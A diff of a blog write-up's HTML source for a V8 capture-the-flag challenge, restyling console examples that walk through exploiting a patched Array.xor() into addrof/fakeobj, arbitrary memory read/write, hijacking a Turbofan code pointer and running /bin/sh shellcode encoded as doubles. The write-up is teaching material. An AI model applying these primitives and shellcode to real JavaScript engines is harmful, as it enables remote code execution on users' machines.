@@ -179,6 +179,17 @@ The patch adds a new **Array.xor()** prototype that can be used to xor all value
 	width: calc(100% - 8px);
 	border-radius: 4px;
 }
+.jsConTerm {
+	white-space: pre-wrap;
+	background: #000;
+	color: #FFF;
+	margin: 0;
+	padding: 4px;
+}
+.jsConTerm::selection, .jsConTerm *::selection {
+	color: #000;
+	background: #FFF;
+}
 .jsConCode {
 	min-height: 14px;
 	margin: 3px;
@@ -597,7 +608,7 @@ You may be wondering why the memory only contains half the address - `0xa3800042
 Pretty cool, let's see what happens if we put an array inside of another array:
 
 <!-- arr = [1.1, 2.2, 3.3]; arr2 = [arr] -->
-<div class="jsConsole" style="margin-bottom: 4px;">
+<div class="jsConsole" style="margin-bottom: 4px">
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr2</span> = [<span class="jsConVar">arr</span>]</div>
 </div>
 <div class="jsMem">
@@ -872,7 +883,7 @@ Exciting! Let's overwrite `arr`'s header with some random stuff and see what hap
 <div class="jsConBorder"></div>
 <div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
 <div class="jsConBorder"></div>
-<div class="jsConLine" style="white-space: pre-wrap; background: #000; color: #FFF; margin:0; padding: 4px">Received signal 11 SEGV_ACCERR 0a381337133e
+<div class="jsConLine jsConTerm">Received signal 11 SEGV_ACCERR 0a381337133e
 ==== C stack trace ===============================
  [0x555557b9ea23]
  [0x555557b9e972]
@@ -1104,22 +1115,43 @@ So we can read and write any memory, how do we turn this into code execution?
 
 We'd probably want to start by looking at how code gets stored and run for functions and stuff.
 
-```js
-> function func() {
-  return 0x1337;
-}
-> func()
-< 4919
-> %DebugPrint(func)
-< ...
-```
+<div class="jsConsole" style="margin-bottom: 4px">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">func</span><span style="white-space: pre-wrap">() {
+     <span class="jsConKw">return</span> <span class="jsConValIn">0x1337</span>;
+   }</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
+</div>
 
 <div class="jsMem">
 	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
-	<div class="jsMemDbg">DebugPrint
- - code: 0x303600032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
+	<div class="jsMemDbg">DebugPrint: 0x3069001d34c9: [Function] in OldSpace
+ - map: 0x3069001c097d &lt;Map[32](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x3069001c08a5 &lt;JSFunction (sfi = 0x306900141885)&gt;
+ - elements: 0x306900000725 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: 
+ - initial_map: 
+ - shared_info: 0x3069001d3439 &lt;SharedFunctionInfo func&gt;
+ - name: 0x3069001d33bd &lt;String[4]: #func&gt;
+ - builtin: InterpreterEntryTrampoline
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x3069001c0205 &lt;NativeContext[295]&gt;
+ - code: 0x306900032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;
+ - interpreted
+ - bytecode: 0x3069002006a5 &lt;BytecodeArray[5]&gt;
+ - source code: () { return 0x1337 }
+ - properties: 0x306900000725 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): { ... }
+ - feedback vector: No feedback vector, but we have a closure feedback cell array</div>
 <div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
-	<div class="jsMemHex">0x1337</div>
+	<div class="jsMemHex">0x3069001d34c8: 0x00000725001c097d 0x00032cc100000725
+0x3069001d34d8: 0x001c0205001d3439 0x00000741001d34b1
+0x3069001d34e8: 0x001d33bd00000a91 0x001d34c9000084a0</div>
 </div>
 
 Ooh we've got something called **code** there! But it's some sort of a **InterpreterEntryTrampoline**, what's that?
@@ -1130,36 +1162,121 @@ But our function is still the trampoline thing! How do we turn it into a turbofa
 
 We need to make V8 think it's important to optimize our code by running it a lot of times, or using debug commands. If we still have the V8 natives syntax enabled from earlier, we can use **%PrepareFunctionForOptimization()** and **%OptimizeFunctionOnNextCall()** to do the trick.
 
-```js
-> function func() {
-  return 0x1337;
-}
-> %DebugPrint(func)
-< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
- - code: 0x2d7a000332c1 <Code BUILTIN CompileLazy>
-> func()
-< 4919
-> %DebugPrint(func)
-< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
- - code: 0x2d7a00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
-> %PrepareFunctionForOptimization(func)
-> func()
-< 4919
-> %DebugPrint(func)
-< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
- - code: 0x2d7a00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
-> %OptimizeFunctionOnNextCall(func)
-> func()
-< 4919
-> %DebugPrint(func)
-< DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
- - code: 0x2d7a002006ed <Code TURBOFAN>
-> codeObj = fakeobj(0x002006ed)
-> %DebugPrint(codeObj)
-<
-```
+<div class="jsConsole" style="margin-bottom: 4px">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">func</span><span style="white-space: pre-wrap">() {
+     <span class="jsConKw">return</span> <span class="jsConValIn">0x1337</span>;
+   }</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a000332c1 &lt;Code BUILTIN CompileLazy&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">PrepareFunctionForOptimization</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">OptimizeFunctionOnNextCall</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
+ - code: 0x2d7a002006ed &lt;Code TURBOFAN&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">codeObj</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConValIn">0x002006ed</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">codeObj</span>)</div>
+</div>
 
-(code debugprint here)
+<div class="jsMem">
+	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
+	<div class="jsMemDbg">DebugPrint: 0x2d7a002006ed: [Code]
+ - map: 0x2d7a00000d61 &lt;Map[64](CODE_TYPE)&gt;
+ - kind: TURBOFAN
+ - deoptimization_data_or_interpreter_data: 0x2d7a0020066d &lt;Other heap object (PROTECTED_FIXED_ARRAY_TYPE)&gt;
+ - position_table: 0x2d7a00180011 &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
+ - instruction_stream: 0x5555b79416f1 &lt;InstructionStream TURBOFAN&gt;
+ - instruction_start: 0x5555b7941700
+ - is_turbofanned: 1
+ - stack_slots: 6
+ - marked_for_deoptimization: 0
+ - embedded_objects_cleared: 0
+ - can_have_weak_objects: 1
+ - instruction_size: 124
+ - metadata_size: 12
+ - inlined_bytecode_size: 0
+ - osr_offset: -1
+ - handler_table_offset: 12
+ - unwinding_info_offset: 12
+ - code_comments_offset: 12
+ - instruction_stream.relocation_info: 0x2d7a002006dd &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
+ - instruction_stream.body_size: 136
+<!---->
+--- Disassembly: ---
+kind = TURBOFAN
+stack_slots = 6
+compiler = turbofan
+address = 0x2d7a002006ed
+<!---->
+Instructions (size = 124)
+0x5555b7941700     0  8b59f4               movl rbx,[rcx-0xc]
+0x5555b7941703     3  4903de               REX.W addq rbx,r14
+0x5555b7941706     6  f6431e20             testb [rbx+0x1e],0x20
+0x5555b794170a     a  0f85f05e03a0         jnz 0x555557977600  (CompileLazyDeoptimizedCode)    ;; near builtin entry
+0x5555b7941710    10  55                   push rbp
+...</div>
+<div class="jsMemTitle">GDB [0x2d7a002006ed]<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">0x2d7a002006ec: 0x0020066d00000d61  0x001d485100180011
+0x2d7a002006fc: 0xb7941700b79416f1  0x800000dc00005555
+0x2d7a0020070c: 0x0000000c0000007c  0xffffffff00000000
+0x2d7a0020071c: 0x0000000c0000000c  0xffff00010000000c
+0x2d7a0020072c: 0x0000000800000595  0x001d33fd001d3459
+0x2d7a0020073c: 0x001d4881001d3541  0x0000004e00000949
+0x2d7a0020074c: 0x00000000001d4891  0x0020072d00180011
+0x2d7a0020075c: 0x0000001000000010  0x00b0081700000000
+0x2d7a0020076c: 0xf8f937030bc90cca  0xb00f17ca03012100
+0x2d7a0020077c: 0xc905f8310a0dc902  0x450313ca07f8f965
+0x2d7a0020078c: 0x0000059500af02f9  0x001d48f500000012
+0x2d7a0020079c: 0x001d4901001d33ed  0x001d4921001d4911
+0x2d7a002007ac: 0x001d3595001d33fd  0x001d4931001d3581
+0x2d7a002007bc: 0x000000b400000949  0x00000000001d4941
+0x2d7a002007cc: 0x0020079100180011  0x0000001000000028
+0x2d7a002007dc: 0x2500007e00000000  0x13c7010121c80cca
+0x2d7a002007ec: 0xf93703f5f665c602  0x010121c8010d05f7</div>
+<div class="jsMemTitle">GDB [0x5555b7941700]<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">0x5555b7941700: 0x43f6de0349f4598b  0xa0035ef0850f201e
+0x5555b7941710: 0x48505756e5894855  0x0fa0653b4908ec83
+0x5555b7941720: 0x266eb80000001f86  0x8b48e84d8b480000
+0x5555b7941730: 0x037f01f983485de5  0x248d485a410008c2
+0x5555b7941740: 0x000030bac35241cc  0xbb48e07589485200
+0x5555b7941750: 0x0000555556d0ccf0  0x05ba4800000001b8
+0x5555b7941760: 0x4800002d7a001c02  0xb8a00d1851e8f28b
+0x5555b7941770: 0x4190b4eb0000266e  0x0000000190d855ff
+0x5555b7941780: 0x0178016f00000491  0x0000000000000000
+0x5555b7941790: 0x0000000000000000  0x0000000000000000
+0x5555b79417a0: 0x0000000000000000  0x0000000000000000
+0x5555b79417b0: 0x0000000000000000  0x0000000000000000</div>
+</div>
 
 Awesome, we have a code object that points to an address where the code gets run from, and we can change it to whatever we want. Let's make a part of the memory just the [0xCC INT3](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29#INT3) breakpoint opcode - this will temporarily pause the execution and send a [SIGTRAP signal](https://en.wikipedia.org/wiki/Signal_%28IPC%29#SIGTRAP) to gdb so we can look into the current state.
 
@@ -1355,36 +1472,49 @@ Perfect! We found the place in the rwx memory our 0xCC instruction got put in, a
 
 The solution to that is creating some very special shellcode that carefully jumps from one double to the next in a way where our code is the only code getting executed. [Anvbis' writeup](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) does a way better job of explaining this than I ever could, so go check it out!
 
-```js
-> function shellcode() {
-  return [ // `/bin/sh` shellcode nabbed from that Anvbis writeup
-    1.9711828979523134e-246,
-    1.9562205631094693e-246,
-    1.9557819155246427e-246,
-    1.9711824228871598e-246,
-    1.971182639857203e-246,
-    1.9711829003383248e-246,
-    1.9895153920223886e-246,
-    1.971182898881177e-246
-  ]
-}
-> shellcode();
-> %PrepareFunctionForOptimization(shellcode);
-> shellcode();
-> %OptimizeFunctionOnNextCall(shellcode);
-> shellcode();
-> funcAddr = addrof(shellcode)
-> codeAddr = read(funcAddr + 0x8n) >> 32n
-> instructionStart = codeAddr + 0x14n
-> write(instructionStart, read(instructionStart) + 0x53n);
-> shellcode();
-lyra@horse:~$ whoami
+<div class="jsConsole" style="margin-bottom: 4px">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">shellcode</span><span style="white-space: pre-wrap">() {
+     <span class="jsConKw">return</span> [
+       <span class="jsConValIn">1.9711828979523134e-246</span>,
+       <span class="jsConValIn">1.9562205631094693e-246</span>,
+       <span class="jsConValIn">1.9557819155246427e-246</span>,
+       <span class="jsConValIn">1.9711824228871598e-246</span>,
+       <span class="jsConValIn">1.971182639857203e-246</span>,
+       <span class="jsConValIn">1.9711829003383248e-246</span>,
+       <span class="jsConValIn">1.9895153920223886e-246</span>,
+       <span class="jsConValIn">1.971182898881177e-246</span>
+     ]
+   }</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">PrepareFunctionForOptimization</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">OptimizeFunctionOnNextCall</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">funcAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">codeAddr</span> = <span class="jsConVar">read</span>(<span class="jsConVar">funcAddr</span> + <span class="jsConValIn">0x8n</span>) &gt;&gt; <span class="jsConValIn">32n</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">instructionStart</span> = <span class="jsConVar">codeAddr</span> + <span class="jsConValIn">0x14n</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">write</span>(<span class="jsConVar">instructionStart</span>, <span class="jsConVar">read</span>(<span class="jsConVar">instructionStart</span>) + <span class="jsConValIn">0x53n</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">shellcode</span>()</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm"><span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$ whoami
 lyra
-lyra@horse:~$ fortune
-Flee at once, all is discovered.
-lyra@horse:~$
-```
-We got shell!!! We're almost there except...
+<span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$ fortune
+You have a deep interest in all that is artistic.
+<span style="color:var(--lyreGold)">lyra@horse</span>:<span style="color:#F00">~</span>$</div>
+</div>
+<!-- i was rerunning the commands to see how i should style it in the css and i got that fortune ^^ -->
+
+**We got shell!!!** We're almost there, except...
 
 ## Part 5: Please don't collect the garbage
 
@@ -1392,20 +1522,28 @@ We're still reliant on the **%PrepareFunctionForOptimization()** and **%Optimize
 
 We want to somehow tell V8 to optimize our function with Turbofan, and the easiest way to accomplish that is to just run our function a lot of times, let's give it a shot!
 
-```js
-> for (let i = 0; i < 10000; i++) shellcode();
-> %DebugPrint(shellcode)
-DebugPrint: 0x128c001d3e95: [Function] in OldSpace
- - code: 0x128c00032cc1 <Code BUILTIN InterpreterEntryTrampoline>
-> for (let i = 0; i < 100000; i++) shellcode();
-> %DebugPrint(shellcode)
-DebugPrint: 0x128c001d3e95: [Function] in OldSpace
- - code: 0x128c0020051d <Code MAGLEV>
-> for (let i = 0; i < 1000000; i++) shellcode();
-> %DebugPrint(shellcode)
-DebugPrint: 0x128c001d3e95: [Function] in OldSpace
- - code: 0x128c00200ad9 <Code TURBOFAN>
-```
+<div class="jsConsole" style="margin-bottom: 4px">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">10000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c0020051d &lt;Code MAGLEV&gt;</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">1000000</span>; <span class="jsConVar">i</span>++) <span class="jsConVar">shellcode</span>();</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">shellcode</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine jsConTerm">DebugPrint: 0x128c001d3e95: [Function] in OldSpace
+ - code: 0x128c00200ad9 &lt;Code TURBOFAN&gt;</div>
+</div>
 
 Yay, we got our Turbofan code without having to use the debug function stuff! Now let's try running the exploit again.
 
@@ -1584,7 +1722,7 @@ With that added, **we have our final exploit code**.
 **Let's get the flag!**
 
 
-<div class="termCode"><span class="termCodeW">$ nc arrayxor.challs.open.ecsc2024.it 38020</span>
+<div class="termCode" style="overflow-wrap: anywhere"><span class="termCodeW">$ nc arrayxor.challs.open.ecsc2024.it 38020</span>
 Do Hashcash for 24 bits with resource "k2v9WzPBJK2N"
 https://pow.cybersecnatlab.it/?data=k2v9WzPBJK2N&bits=24
 or
@@ -1607,31 +1745,31 @@ The first thing is something I've already implemented in the final exploit code 
 <div class="jsConsole">
 	<div class="jsConCode"><span class="jsConNull">// snippet from Popax21's exploit code</span>
 <span class="jsConKw">function</span> <span class="jsConIdx">obj2ptr</span>(<span class="jsConIdx">obj</span>) {
-    <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
+  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
 <!---->
-    <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
-        <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
-            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
-            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
-            <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
-        } 
-    });
+  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
+    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
+      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
+    } 
+  });
 <!---->
-    <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
+  <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
 }
 <!---->
 <span class="jsConKw">function</span> <span class="jsConIdx">ptr2obj</span>(<span class="jsConIdx">ptr</span>) {
-    <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
+  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
 <!---->
-    <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
-        <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
-            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
-            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = (<span class="jsConVar">ptr</span> &gt;&gt; <span class="jsConValIn">1</span>);
-            <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Set the lowest bit -&gt; compressed pointer</span>
-        } 
-    });
+  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
+    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = (<span class="jsConVar">ptr</span> &gt;&gt; <span class="jsConValIn">1</span>);
